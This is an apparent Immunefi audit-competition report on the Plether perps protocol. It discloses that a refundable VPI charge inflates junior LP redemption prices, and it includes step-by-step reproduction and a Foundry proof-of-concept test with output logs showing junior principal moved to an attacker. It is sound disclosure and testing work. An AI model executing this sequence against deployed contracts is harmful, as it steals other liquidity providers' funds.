# \#98921 [SC-Critical]  Junior LP redeems at a share price inflated by its own refundable VPI charge, stealing principal from other LPs

**Submitted on Nov 10th 2026 at 22:45:12 UTC by @v4rvl for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98921
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary

A position that increases skew pays virtual price impact (VPI) `C` in cash into `HousePool` when it opens. When the same position closes back toward balance, the pool pays up to `C` back to it as a rebate. Between those two events the charge is refundable, but the reconcile that prices LP redemptions counts it as junior equity.

An attacker who is both a junior LP and a trader queues a redemption, opens a large position into an empty book just before the epoch settles, lets the settlement price its redemption with `C` inside junior NAV, and then closes and takes `C` back. Its redemption is paid `s·C` too much, where `s` is its junior share, and the rebate is paid from a pool that now holds only the remaining junior LPs. The trade leg costs only the two execution fees and seconds of carry.

Measured at the release parameters, with a constant price of 1.00:

- **Senior-backed pool** (2,000,000 senior, 1,000,000 incumbent junior LP `bob`, attacker 3,000,000 junior): one cycle gives the attacker **+1,424.48 USDG** against not trading, and `bob` loses **2,334.43 USDG**. Three consecutive 3-hour cycles give **+4,282.54** and **−7,012.80**.
- **Junior-only pool** (attacker 1,500,000 of 2,500,000 junior): `bob` redeems **999,297.60 USDG** on a 1,000,000 USDG deposit, against 999,999.89 when nobody trades.

The control executes the same open and the same close, but closes before the settlement. The attacker then ends below its no-trade result in every scenario. Senior principal is identical across all arms, so this is a transfer from the continuing junior LPs to the attacker.

## Root cause

1. **The open charge becomes pool cash.** The open computes `vpiAssets = C(S_post) − C(S_pre)` and adds it to the trade cost (`OpenAccountingLib.sol:127-135`, curve in `CfdMath.sol:115-140`). The charge is collected into `HousePool` and raises `pool.totalAssets()`. Only negative accrual gets a reserve (`CfdEngineSettlementSidecar.sol:373-378`); positive `vpiAccrued` has none.
2. **The close gives it back.** The close computes VPI on the same curve and clamps only so that lifetime VPI does not go negative (`CloseAccountingLib.sol:112-118`):

   ```solidity
           // Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
           // where an attacker opens at high depth, reduces pool depth, then closes to extract a
           // net-negative lifetime VPI rebate. ...
           if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
               state.vpiDeltaAssets = -state.proportionalAccrualAssets;
           }
   ```

   A position that paid `C` and closes back to balance receives up to `C`, paid from free pool cash (`CfdEnginePlanLib.sol:973-977`).
3. **LP pricing counts the refundable charge as equity.** `HousePoolAccountingLib.buildReconcileSnapshot` computes distributable value from physical assets, trader claims and the terminal price delta only (`HousePoolAccountingLib.sol:60-78`):

   ```solidity
           uint256 terminalAssets = engineSnapshot.physicalAssets;
           uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
           int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
           ...
               snapshot.distributable = terminalAssets - terminalLiabilities;
   ```

   `TerminalNavBookV2` aggregates only price PnL (`TerminalNavBookV2.sol:54-58`). `HousePool._settleLpEpoch` reconciles from this snapshot and then prices junior redemptions at `juniorPrincipal / juniorSupply` (`HousePool.sol:835-841`).

Between the open and the close, junior NAV is therefore overstated by the positive accrual that the close will take back. Whoever redeems in that window keeps its share of it, and whoever stays pays the whole rebate.

The existing lifetime clamp guards a different LP sandwich: depth manipulation that pulls a rebate larger than the charge. This attack manipulates no depth and nets zero lifetime VPI on the trade leg. The value is taken through the redemption price.

## Proof of Concept

## Steps to reproduce

The attacker uses one address for both legs.

1. `juniorVault.requestDeposit`; the epoch settles with nothing open; `claimDeposit`.
2. After the one-hour cooldown, `juniorVault.requestRedeem(allShares)`. It matures at the next epoch boundary `e`.
3. Just after `e`: `router.commitOrder(LONG, ~38% of depth)` then `router.executeOrder`. The book is empty, so the open pays the full `C`.
4. `router.settleLpEpoch` (permissionless) prices and funds the redemption with `C` inside junior NAV.
5. `router.commitOrder(close)` then `router.executeOrder`. The rebate returns `C` to the attacker.
6. `juniorVault.claimRedeem`. Re-deposit the payout and repeat.

## Proof of concept

Save the file below as `packages/perps/test/perps/VpiGivebackRedemptionPoc.t.sol` and run from `packages/perps/`:

```bash
forge test --match-path test/perps/VpiGivebackRedemptionPoc.t.sol -vv
```

The test uses the repository's `OrderRouterPythTestBase` fixture. It applies the release risk and pool parameters through the owner's documented timelocked setters and asserts them. Every LP, trade and settlement action uses a public entrypoint. `MockPyth` stands in only for Pyth price updates. No in-scope contract is modified.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

import {console2} from "forge-std/console2.sol";

import {OrderRouterPythTestBase} from "./shared/OrderRouterTestBase.sol";

/// A junior LP that is also a trader redeems at a junior price that still contains its own refundable VPI charge,
/// then takes the charge back through the close-time rebate. The continuing junior LPs fund the difference.
///
/// Every arm uses a constant basket price of 1.00 and the same timeline, except for when the close happens:
///   ATTACK  : redemption queued; attacker opens LONG into an empty book right after the epoch boundary (e+10/e+12);
///             the epoch settles (e+30, redemption priced); attacker closes (e+40/e+42, rebate paid by the pool).
///   CONTROL : same open and same close, but the close executes BEFORE the epoch settles (e+20/e+22), i.e. 20 seconds
///             earlier than in ATTACK. Every other timestamp is identical.
///   NOTRADE : same timeline, no trade.
/// After the attacker's cycles, the incumbent junior LP (bob) redeems in the next epoch with no position open.
contract VpiGivebackRedemptionPoc is OrderRouterPythTestBase {
    address internal attacker = address(0xA77AC4);
    address internal keeper = address(0x4EE9);
    address internal carol = address(0xCA201); // senior LP

    int64 internal constant PX = 100_000_000; // 1.00 on both feeds -> basket 1.00
    uint256 internal constant T0 = SETUP_TIMESTAMP + 10 hours; // Monday 16:00 UTC, live market, hour-aligned
    uint256 internal constant TRADER_COLLATERAL = 100_000e6;
    uint256 internal constant TRADER_MARGIN = 40_000e6;
    uint256 internal constant BOB_DEPOSIT = 1_000_000e6; // funded by the shared fixture

    uint8 internal constant ATTACK = 0;
    uint8 internal constant CONTROL = 1;
    uint8 internal constant NOTRADE = 2;

    struct Cfg {
        uint256 attackerDeposit; // attacker's junior deposit
        uint256 seniorDeposit; // 0 = no senior LP beyond the seed
        uint256 skewPct; // open notional as % of economic depth at the open
        uint256 cycles;
        bool releasePoolCaps; // maxSeniorShareBps 8_000, maxSeniorExposureAssets 40M (DEPLOYMENT.md)
        uint256 bobRedeemBps; // share of bob's junior shares redeemed at the end (senior-share covenant caps exits)
    }

    struct Arm {
        uint256 notionalFirstCycle;
        int256 vpiChargeFirstCycle; // engine vpiAccrued right after the first open
        uint256 attackerRedemptions; // USDG received from all attacker redemptions
        int256 traderLegDelta; // attacker clearinghouse wealth change across all cycles
        int256 attackerNet; // attacker total wealth after - before (LP leg + trader leg)
        uint256 treasuryDelta;
        uint256 bobPayout; // raw USDG received by bob for the redeemed fraction
        uint256 bobRemainingValue; // bob's remaining shares at the settled junior price, nothing open
        uint256 seniorPrincipalEnd;
    }

    // --------------------------------------------------------------------------------------------- helpers

    /// Release parameters (DEPLOYMENT.md) through the owner's documented timelocked paths.
    function _applyRelease(bool releasePoolCaps) internal {
        if (releasePoolCaps) {
            IHousePool.PoolConfig memory pc = _currentPoolConfig();
            pc.maxSeniorExposureAssets = 40_000_000e6;
            pc.maxSeniorShareBps = 8_000;
            pool.proposePoolConfig(pc);
            vm.warp(pool.poolConfigActivationTime());
            pool.finalizePoolConfig();
        }
        ICfdEngineAdminHost.EngineRiskConfig memory config;
        config.riskParams = CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5_000,
            protocolShareBps: 0
        });
        config.executionFeeBps = 4;
        config.frozenCloseSpreadBps = 50;
        config.settlementBufferBps = 25;
        engineAdmin.proposeRiskConfig(config);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        engineAdmin.finalizeRiskConfig();
        (uint256 k, uint256 maxSkew, uint256 maint, uint256 init,,,,,,) = engine.riskParams();
        assertEq(k, 0.01e18, "release vpiFactor");
        assertEq(maxSkew, 0.4e18, "release maxSkewRatio");
        assertEq(maint, 10, "release maint");
        assertEq(init, 20, "release init");
        assertEq(uint256(engine.executionFeeBps()), 4, "release execution fee");
    }

    function _blob(int64 price, uint256 publishTime, uint256 prevPublishTime)
        internal
        pure
        returns (bytes[] memory data)
    {
        MockPyth.FeedUpdate[] memory u = new MockPyth.FeedUpdate[](2);
        u[0] = MockPyth.FeedUpdate(FEED_A, MockPyth.MockPrice(price, 0, int32(-8), publishTime, prevPublishTime));
        u[1] = MockPyth.FeedUpdate(FEED_B, MockPyth.MockPrice(price, 0, int32(-8), publishTime, prevPublishTime));
        data = new bytes[](1);
        data[0] = abi.encode(u);
    }

    function _at(uint256 t) internal {
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
    }

    /// Permissionless LP epoch settlement with a current-epoch signed price.
    function _settle(uint256 t) internal {
        _at(t);
        bytes[] memory b = _blob(PX, t - 1, t - 2);
        vm.prank(keeper);
        router.settleLpEpoch(b);
    }

    /// Public commit, then public execution with the first post-commit tick.
    function _trade(uint256 size, uint256 margin, bool isClose, uint256 t) internal {
        _at(t);
        vm.prank(attacker);
        uint64 id = router.commitOrder(CfdTypes.Side.LONG, size, margin, 0, isClose);
        _at(t + 2);
        bytes[] memory b = _blob(PX, t + 1, t);
        vm.prank(attacker);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, b);
        require(r.status == OrderV3Types.LifecycleStatus.Executed, "order must execute");
    }

    function _attackerWealth() internal view returns (uint256) {
        return settlementToken.balanceOf(attacker) + clearinghouse.balanceAssets(attacker)
            + engine.traderClaimBalanceAssets(attacker);
    }

    function _traderWealth() internal view returns (uint256) {
        return clearinghouse.balanceAssets(attacker) + engine.traderClaimBalanceAssets(attacker);
    }

    function _treasuryWealth() internal view returns (uint256) {
        address t = engine.protocolTreasury();
        return settlementToken.balanceOf(t) + clearinghouse.balanceAssets(t);
    }

    function _vpiAccrued(address who) internal view returns (int256 v) {
        (,,,,,, v) = engine.positions(who);
    }

    function _size(address who) internal view returns (uint256 s) {
        (s,,,,,,) = engine.positions(who);
    }

    /// skewPct of economic depth (pool assets net of trader claims), floored to the 100-token size quantum.
    function _notionalFor(uint256 skewPct) internal view returns (uint256) {
        uint256 depth = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        uint256 lots = (depth * skewPct / 100) / 100e6;
        return lots * 100e18;
    }

    // --------------------------------------------------------------------------------------------- scenario

    function _run(uint8 mode, Cfg memory cfg) internal returns (Arm memory a) {
        _applyRelease(cfg.releasePoolCaps);
        _at(T0);
        {
            bytes[] memory prime = _blob(PX, T0 - 1, T0 - 2);
            vm.prank(keeper);
            router.updateMarkPrice(prime);
        }

        settlementToken.mint(attacker, cfg.attackerDeposit + TRADER_COLLATERAL);
        vm.startPrank(attacker);
        settlementToken.approve(address(clearinghouse), type(uint256).max);
        clearinghouse.deposit(attacker, TRADER_COLLATERAL);
        settlementToken.approve(address(juniorVault), type(uint256).max);
        vm.stopPrank();
        uint256 attacker0 = _attackerWealth();
        uint256 trader0 = _traderWealth();
        uint256 treasury0 = _treasuryWealth();

        uint256 seniorReq;
        if (cfg.seniorDeposit > 0) {
            settlementToken.mint(carol, cfg.seniorDeposit);
            _at(T0 + 30);
            vm.startPrank(carol);
            settlementToken.approve(address(seniorVault), cfg.seniorDeposit);
            seniorReq = seniorVault.requestDeposit(cfg.seniorDeposit, carol, carol);
            vm.stopPrank();
        }

        uint256 base = T0;
        uint256 deposit = cfg.attackerDeposit;
        for (uint256 c = 0; c < cfg.cycles; ++c) {
            // 1) attacker junior deposit, activated at an epoch with no position open (clean price)
            _at(base + 60);
            vm.prank(attacker);
            uint256 depId = juniorVault.requestDeposit(deposit, attacker, attacker);
            _settle(base + 1 hours + 120);
            if (c == 0 && cfg.seniorDeposit > 0) {
                uint256 sc = seniorVault.claimableDepositRequest(seniorReq, carol);
                assertEq(sc, cfg.seniorDeposit, "senior deposit activated");
                vm.prank(carol);
                seniorVault.claimDeposit(seniorReq, sc, carol, carol);
            }
            uint256 claimable = juniorVault.claimableDepositRequest(depId, attacker);
            assertEq(claimable, deposit, "attacker deposit activated in full");
            vm.prank(attacker);
            uint256 shares = juniorVault.claimDeposit(depId, claimable, attacker, attacker);

            // 2) after the one-hour cooldown, queue the full redemption (no position exists yet)
            _at(base + 2 hours + 300);
            vm.prank(attacker);
            uint256 redId = juniorVault.requestRedeem(shares, attacker, attacker);

            uint256 e = base + 3 hours; // the redemption matures at this boundary
            uint256 notional = _notionalFor(cfg.skewPct);

            // 3) open into the empty book right after the boundary
            if (mode != NOTRADE) {
                _trade(notional, TRADER_MARGIN, false, e + 10);
                if (c == 0) {
                    a.notionalFirstCycle = notional;
                    a.vpiChargeFirstCycle = _vpiAccrued(attacker);
                }
            } else {
                _at(e + 12);
            }
            // CONTROL: the close (and its VPI rebate) happens BEFORE the redemption is priced
            if (mode == CONTROL) {
                _trade(notional, 0, true, e + 20);
            } else {
                _at(e + 22);
            }

            // 4) permissionless epoch settlement prices and funds the attacker's redemption
            _settle(e + 30);

            // ATTACK: the close (and its VPI rebate) happens AFTER the redemption is priced
            if (mode == ATTACK) {
                _trade(notional, 0, true, e + 40);
            } else {
                _at(e + 42);
            }
            assertEq(_size(attacker), 0, "position flat");

            _at(e + 50);
            uint256 redClaimable = juniorVault.claimableRedeemRequest(redId, attacker);
            assertEq(redClaimable, shares, "attacker redemption funded in full");
            vm.prank(attacker);
            uint256 out = juniorVault.claimRedeem(redId, redClaimable, attacker, attacker);
            a.attackerRedemptions += out;
            deposit = out; // recycle the full payout next cycle
            base = e;
        }
        a.traderLegDelta = int256(_traderWealth()) - int256(trader0);
        a.treasuryDelta = _treasuryWealth() - treasury0;
        a.attackerNet = int256(_attackerWealth()) - int256(attacker0);

        // 5) incumbent junior LP redeems in the next epoch, nothing open
        uint256 bobShares = juniorVault.balanceOf(bob) * cfg.bobRedeemBps / 10_000;
        _at(base + 70);
        vm.prank(bob);
        uint256 bobRed = juniorVault.requestRedeem(bobShares, bob, bob);
        _settle(base + 1 hours + 30);
        uint256 bobClaimable = juniorVault.claimableRedeemRequest(bobRed, bob);
        assertEq(bobClaimable, bobShares, "bob redemption funded in full");
        vm.prank(bob);
        a.bobPayout = juniorVault.claimRedeem(bobRed, bobClaimable, bob, bob);
        a.bobRemainingValue = juniorVault.balanceOf(bob) * pool.juniorPrincipal() / juniorVault.totalSupply();
        a.seniorPrincipalEnd = pool.seniorPrincipal();
    }

    function _log(string memory tag, Arm memory a) internal pure {
        console2.log(tag);
        console2.log("  open notional, first cycle (1e18 tokens at 1.00):", a.notionalFirstCycle);
        console2.log("  VPI charged at open, first cycle (6dec):");
        console2.logInt(a.vpiChargeFirstCycle);
        console2.log("  attacker redemption payouts, all cycles (6dec):", a.attackerRedemptions);
        console2.log("  attacker trader-leg delta, all cycles (6dec):");
        console2.logInt(a.traderLegDelta);
        console2.log("  attacker net, LP leg + trader leg (6dec):");
        console2.logInt(a.attackerNet);
        console2.log("  protocol treasury delta (6dec):", a.treasuryDelta);
        console2.log("  bob redeemed payout, raw (6dec):", a.bobPayout);
        console2.log("  bob remaining shares at junior price (6dec):", a.bobRemainingValue);
        console2.log("  senior principal at end (6dec):", a.seniorPrincipalEnd);
    }

    function _compare(Cfg memory cfg) internal {
        uint256 snap = vm.snapshotState();
        Arm memory atk = _run(ATTACK, cfg);
        vm.revertToState(snap);
        Arm memory ctl = _run(CONTROL, cfg);
        vm.revertToState(snap);
        Arm memory none = _run(NOTRADE, cfg);

        _log("ATTACK  (redemption priced before the rebate)", atk);
        _log("CONTROL (same trades, redemption priced after the rebate)", ctl);
        _log("NOTRADE (same timeline, no trade)", none);

        int256 profitVsNoTrade = atk.attackerNet - none.attackerNet;
        int256 bobLossVsNoTrade =
            int256(none.bobPayout + none.bobRemainingValue) - int256(atk.bobPayout + atk.bobRemainingValue);
        console2.log("attacker profit: ATTACK - NOTRADE (6dec):");
        console2.logInt(profitVsNoTrade);
        console2.log("attacker profit: ATTACK - CONTROL (6dec):");
        console2.logInt(atk.attackerNet - ctl.attackerNet);
        console2.log("bob loss, payout + remaining value: NOTRADE - ATTACK (6dec):");
        console2.logInt(bobLossVsNoTrade);
        console2.log("bob loss, raw payout: NOTRADE - ATTACK (6dec):");
        console2.logInt(int256(none.bobPayout) - int256(atk.bobPayout));
        console2.log("bob loss, raw payout: CONTROL - ATTACK (6dec):");
        console2.logInt(int256(ctl.bobPayout) - int256(atk.bobPayout));

        // A real VPI charge, identical in both traded arms.
        assertGt(atk.vpiChargeFirstCycle, 1_000e6, "material VPI charge");
        assertEq(atk.vpiChargeFirstCycle, ctl.vpiChargeFirstCycle, "same charge in both traded arms");
        // The trader leg gets the charge back: its loss is only fees and carry (< 0.1% of notional per cycle).
        assertLt(-atk.traderLegDelta, int256(cfg.cycles * atk.notionalFirstCycle / 1e12 / 1_000), "rebate returned");
        // The attacker profits against both controls.
        assertGt(profitVsNoTrade, 0, "attacker profits vs no trade");
        assertGt(atk.attackerNet, ctl.attackerNet, "ordering alone creates the profit");
        // The continuing junior LP pays: worse than both controls, and by more than the attacker's profit.
        assertLt(atk.bobPayout, none.bobPayout, "bob worse than no trade");
        assertLt(atk.bobPayout, ctl.bobPayout, "bob worse than honest ordering");
        assertGt(bobLossVsNoTrade, profitVsNoTrade, "bob's loss funds the attacker's profit");
        // Senior is identical across arms: the transfer is junior-to-junior.
        assertEq(atk.seniorPrincipalEnd, none.seniorPrincipalEnd, "senior identical");
    }

    // --------------------------------------------------------------------------------------------- tests

    /// Junior-only book: fixture seeds + bob 1,000,000 junior; attacker deposits 1,500,000 junior; 38% skew.
    function test_A_juniorOnly_oneCycle() public {
        _compare(
            Cfg({
                attackerDeposit: 1_500_000e6,
                seniorDeposit: 0,
                skewPct: 38,
                cycles: 1,
                releasePoolCaps: false,
                bobRedeemBps: 10_000
            })
        );
    }

    /// Senior-backed book under the release pool caps (maxSeniorShareBps 8,000; senior rate 800 bps):
    /// senior 2,000,000; bob 1,000,000 junior; attacker 3,000,000 junior; 38% skew.
    function test_B_seniorBacked_releaseCaps_oneCycle() public {
        _compare(
            Cfg({
                attackerDeposit: 3_000_000e6,
                seniorDeposit: 2_000_000e6,
                skewPct: 38,
                cycles: 1,
                releasePoolCaps: true,
                bobRedeemBps: 4_000
            })
        );
    }

    /// Same as B, repeated for three consecutive 3-hour cycles, recycling the full payout each time.
    function test_C_seniorBacked_releaseCaps_threeCycles() public {
        _compare(
            Cfg({
                attackerDeposit: 3_000_000e6,
                seniorDeposit: 2_000_000e6,
                skewPct: 38,
                cycles: 3,
                releasePoolCaps: true,
                bobRedeemBps: 4_000
            })
        );
    }
}
```

Output:

```text
Ran 3 tests for test/perps/VpiGivebackRedemptionPoc.t.sol:VpiGivebackRedemptionPoc
[PASS] test_A_juniorOnly_oneCycle() (gas: 27221049)
Logs:
  ATTACK  (redemption priced before the rebate)
    open notional, first cycle (1e18 tokens at 1.00): 950700000000000000000000
    VPI charged at open, first cycle (6dec):
  1806216007
    attacker redemption payouts, all cycles (6dec): 1501083285510
    attacker trader-leg delta, all cycles (6dec):
  -760585360
    attacker net, LP leg + trader leg (6dec):
  322700150
    protocol treasury delta (6dec): 380280000
    bob redeemed payout, raw (6dec): 999297603440
    bob remaining shares at junior price (6dec): 0
    senior principal at end (6dec): 1000127932
  CONTROL (same trades, redemption priced after the rebate)
    open notional, first cycle (1e18 tokens at 1.00): 950700000000000000000000
    VPI charged at open, first cycle (6dec):
  1806216007
    attacker redemption payouts, all cycles (6dec): 1500228850609
    attacker trader-leg delta, all cycles (6dec):
  -761868273
    attacker net, LP leg + trader leg (6dec):
  -533017664
    protocol treasury delta (6dec): 380280000
    bob redeemed payout, raw (6dec): 1000152466398
    bob remaining shares at junior price (6dec): 0
    senior principal at end (6dec): 1000127932
  NOTRADE (same timeline, no trade)
    open notional, first cycle (1e18 tokens at 1.00): 0
    VPI charged at open, first cycle (6dec):
  0
    attacker redemption payouts, all cycles (6dec): 1499999989181
    attacker trader-leg delta, all cycles (6dec):
  0
    attacker net, LP leg + trader leg (6dec):
  -10819
    protocol treasury delta (6dec): 0
    bob redeemed payout, raw (6dec): 999999892126
    bob remaining shares at junior price (6dec): 0
    senior principal at end (6dec): 1000127932
  attacker profit: ATTACK - NOTRADE (6dec):
  322710969
  attacker profit: ATTACK - CONTROL (6dec):
  855717814
  bob loss, payout + remaining value: NOTRADE - ATTACK (6dec):
  702288686
  bob loss, raw payout: NOTRADE - ATTACK (6dec):
  702288686
  bob loss, raw payout: CONTROL - ATTACK (6dec):
  854862958

[PASS] test_B_seniorBacked_releaseCaps_oneCycle() (gas: 31486359)
Logs:
  ATTACK  (redemption priced before the rebate)
    open notional, first cycle (1e18 tokens at 1.00): 2280700000000000000000000
    VPI charged at open, first cycle (6dec):
  4333216002
    attacker redemption payouts, all cycles (6dec): 3003222038250
    attacker trader-leg delta, all cycles (6dec):
  -1824616035
    attacker net, LP leg + trader leg (6dec):
  1397422215
    protocol treasury delta (6dec): 912280000
    bob redeemed payout, raw (6dec): 399055281012
    bob remaining shares at junior price (6dec): 598582921519
    senior principal at end (6dec): 2001054466161
  CONTROL (same trades, redemption priced after the rebate)
    open notional, first cycle (1e18 tokens at 1.00): 2280700000000000000000000
    VPI charged at open, first cycle (6dec):
  4333216002
    attacker redemption payouts, all cycles (6dec): 3000659331493
    attacker trader-leg delta, all cycles (6dec):
  -1827699510
    attacker net, LP leg + trader leg (6dec):
  -1168368017
    protocol treasury delta (6dec): 912280000
    bob redeemed payout, raw (6dec): 400080571824
    bob remaining shares at junior price (6dec): 600120857736
    senior principal at end (6dec): 2001054466161
  NOTRADE (same timeline, no trade)
    open notional, first cycle (1e18 tokens at 1.00): 0
    VPI charged at open, first cycle (6dec):
  0
    attacker redemption payouts, all cycles (6dec): 2999972938441
    attacker trader-leg delta, all cycles (6dec):
  0
    attacker net, LP leg + trader leg (6dec):
  -27061559
    protocol treasury delta (6dec): 0
    bob redeemed payout, raw (6dec): 399989052759
    bob remaining shares at junior price (6dec): 599983579138
    senior principal at end (6dec): 2001054466161
  attacker profit: ATTACK - NOTRADE (6dec):
  1424483774
  attacker profit: ATTACK - CONTROL (6dec):
  2565790232
  bob loss, payout + remaining value: NOTRADE - ATTACK (6dec):
  2334429366
  bob loss, raw payout: NOTRADE - ATTACK (6dec):
  933771747
  bob loss, raw payout: CONTROL - ATTACK (6dec):
  1025290812

[PASS] test_C_seniorBacked_releaseCaps_threeCycles() (gas: 69128822)
Logs:
  ATTACK  (redemption priced before the rebate)
    open notional, first cycle (1e18 tokens at 1.00): 2280700000000000000000000
    VPI charged at open, first cycle (6dec):
  4333216002
    attacker redemption payouts, all cycles (6dec): 9019345607352
    attacker trader-leg delta, all cycles (6dec):
  -5474728223
    attacker net, LP leg + trader leg (6dec):
  4201349406
    protocol treasury delta (6dec): 2737280000
    bob redeemed payout, raw (6dec): 397161744058
    bob remaining shares at junior price (6dec): 595742616087
    senior principal at end (6dec): 2001164115156
  CONTROL (same trades, redemption priced after the rebate)
    open notional, first cycle (1e18 tokens at 1.00): 2280700000000000000000000
    VPI charged at open, first cycle (6dec):
  4333216002
    attacker redemption payouts, all cycles (6dec): 9003956450110
    attacker trader-leg delta, all cycles (6dec):
  -5483980278
    attacker net, LP leg + trader leg (6dec):
  -3505647536
    protocol treasury delta (6dec): 2737280000
    bob redeemed payout, raw (6dec): 400241463143
    bob remaining shares at junior price (6dec): 600362194716
    senior principal at end (6dec): 2001164115156
  NOTRADE (same timeline, no trade)
    open notional, first cycle (1e18 tokens at 1.00): 0
    VPI charged at open, first cycle (6dec):
  0
    attacker redemption payouts, all cycles (6dec): 8999837627174
    attacker trader-leg delta, all cycles (6dec):
  0
    attacker net, LP leg + trader leg (6dec):
  -81187281
    protocol treasury delta (6dec): 0
    bob redeemed payout, raw (6dec): 399966865636
    bob remaining shares at junior price (6dec): 599950298456
    senior principal at end (6dec): 2001164115156
  attacker profit: ATTACK - NOTRADE (6dec):
  4282536687
  attacker profit: ATTACK - CONTROL (6dec):
  7706996942
  bob loss, payout + remaining value: NOTRADE - ATTACK (6dec):
  7012803947
  bob loss, raw payout: NOTRADE - ATTACK (6dec):
  2805121578
  bob loss, raw payout: CONTROL - ATTACK (6dec):
  3079719085

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 83.52ms (125.46ms CPU time)

Ran 1 test suite in 94.52ms (83.52ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

**What each test shows**

Each test runs ATTACK, CONTROL and NOTRADE from the same snapshot and asserts:

- a VPI charge above 1,000 USDG, identical in ATTACK and CONTROL;
- a trade-leg loss below 0.1% of notional, so the close returned the charge;
- attacker net above NOTRADE and above CONTROL;
- `bob`'s payout below both NOTRADE and CONTROL, and his loss larger than the attacker's profit;
- identical senior principal in ATTACK and NOTRADE.

## Impact

The PoC runs three arms. The basket price is 1.00 for every tick in every arm.

- **ATTACK:** open at `e+10`/`e+12` (commit/execute), settlement at `e+30`, close at `e+40`/`e+42`. The redemption is priced while the position is open.
- **CONTROL:** the same open and the same close, but the close is at `e+20`/`e+22`, before the settlement at `e+30`.
- **NOTRADE:** the same LP timeline with no trade.

After the attacker's cycles, the incumbent junior LP `bob` redeems with nothing open. Amounts are USDG, converted from the PoC's 6-decimal output.

| Scenario | VPI charge `C` | Attacker vs NOTRADE | Attacker vs CONTROL | `bob`'s loss vs NOTRADE | Treasury (open fees) |
|---|---:|---:|---:|---:|---:|
| A: junior-only, attacker 1.5M of 2.5M junior, open 950,700 | 1,806.22 | **+322.71** | +855.72 | **702.29** | 380.28 |
| B: release pool caps, senior 2M, `bob` 1M, attacker 3M junior, open 2,280,700 | 4,333.22 | **+1,424.48** | +2,565.79 | **2,334.43** | 912.28 |
| C: as B, three consecutive 3-hour cycles | 4,333.22 (first cycle) | **+4,282.54** | +7,707.00 | **7,012.80** | 2,737.28 |

In B, `bob` redeems 40% of his shares (the senior-share covenant caps larger exits); his loss counts the payout and the remaining shares at the settled junior price. In A he redeems everything, and his raw payout is 999,297.60 against 999,999.89 in NOTRADE.

How the numbers fit together, using B:

- **The trade leg gets its charge back.** The attacker's clearinghouse balance falls by 1,824.62 across the round trip: the two 0.04% execution fees (2 × 912.28) plus 0.06 of carry. The 4,333.22 charge was fully refunded.
- **The redemption is overpaid by `s·C`.** The attacker's redemption pays 3,003,222.04 against 2,999,972.94 in NOTRADE, +3,249.10. That equals `s·C` with `s = 3,000,000 / 4,001,000 = 0.7498`.
- **The continuing junior LPs pay.** The attacker's profit (1,424.48) plus the open fee sent to the treasury (912.28) equals `bob`'s loss (2,334.43) plus about 2.3 for the junior seed holder. Senior principal is identical in all arms.
- **It repeats linearly.** Three cycles yield about 3 × 1,427.5 for the attacker and 3 × 2,337.6 for `bob`'s loss.

`bob`'s loss is principal, not foregone yield: in A he gets back less than he deposited.

**The CONTROL differs from ATTACK only in when the close happens.** Price is identical in both arms. The control's close is 20 seconds earlier (`e+20`/`e+22` against `e+40`/`e+42`); the open, the settlement at `e+30`, the redemption claim and all of `bob`'s steps share the same timestamps. Moving the close before the settlement is the ordering under test, and the 20 seconds do not explain the result:

- The only quantity that grows with time while the position is open is carry. In B the attacker's whole 30-second hold costs 0.056 USDG of carry (trade-leg loss 1,824.616035 against 1,824.56 of fees), so the extra 20 seconds are worth about 0.04 USDG. They are paid by the attacker in ATTACK, so they work against the result, which is +2,565.79 against CONTROL. In A the whole hold costs 0.025 USDG.
- The trade legs differ by 3.08 USDG in ATTACK's favour (−1,824.62 against −1,827.70). That comes from the rebate, not the time: in CONTROL the close's curve rebate is computed at a pool depth that already contains the collected charge, so it falls slightly short of `C` (about `C²/D` ≈ 3.1 USDG, derived); in ATTACK the rebate is clamped at exactly `C`. The 3.08 is 0.12% of the ordering gain. The rest comes from the redemption price.

**Mapping to the program row.** Critical "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield": junior LP principal held in `HousePool` moves to the attacker through public calls. The attacker ends with more than in either control, and the continuing junior LP ends with less, below its deposit in scenario A. The attacker profits, so the griefing downgrade does not apply.

## Limits

- **Size of `s`.** Per cycle the attacker nets `s·C − 2·fee − carry`, with `C = k·S²/(2D) ≤ 0.0008·D` at the 40% skew cap and `fee = 0.0004·S`. At `S = 0.38·D` this is positive once the attacker holds more than about 42% of junior (derived from the curve; the ordering boundary is measured by CONTROL). In B it is about 0.024% of pool depth per cycle for the attacker and 0.23% of the victim's capital per cycle.
- **Settlement race.** If another caller settles the matured redemption before the attacker opens, the redemption is priced with nothing open and the cycle collapses to NOTRADE; the attacker loses only gas. The attacker can settle the epoch itself (`OrderRouter.sol:479`), and does so in the PoC, so it only needs to act before anyone else settles that epoch. A contested-settlement arm was not measured.
- **Redemption size** is bounded by free cash (pool assets minus the largest directional liability and the 0.25% buffer) and by the senior-share covenant. The PoC stays within both and asserts that every redemption is funded in full.
- **Cadence.** One cycle needs about 3 hours per capital lot (deposit activation, one-hour cooldown, redemption maturity). Two alternating capital lots could act every epoch; that was not exercised.

